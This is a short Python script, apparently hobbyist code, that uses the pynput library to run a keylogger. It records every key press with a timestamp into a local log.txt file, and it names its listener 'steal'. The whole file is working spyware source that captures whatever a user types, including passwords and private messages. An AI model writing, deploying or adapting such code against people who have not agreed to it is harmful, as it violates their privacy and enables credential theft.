from pynput.keyboard import Listener
import logging
import os

log_dir = r""
logging.basicConfig(filename=(log_dir+"log.txt"), 
level=logging.DEBUG, 
format='%(asctime)s : %(message)s',datefmt='%Y-%m-%d %H-%M-%S')

def on_press(key):
    logging.info(str(key))
with Listener(on_press = on_press) as steal:
    steal.join()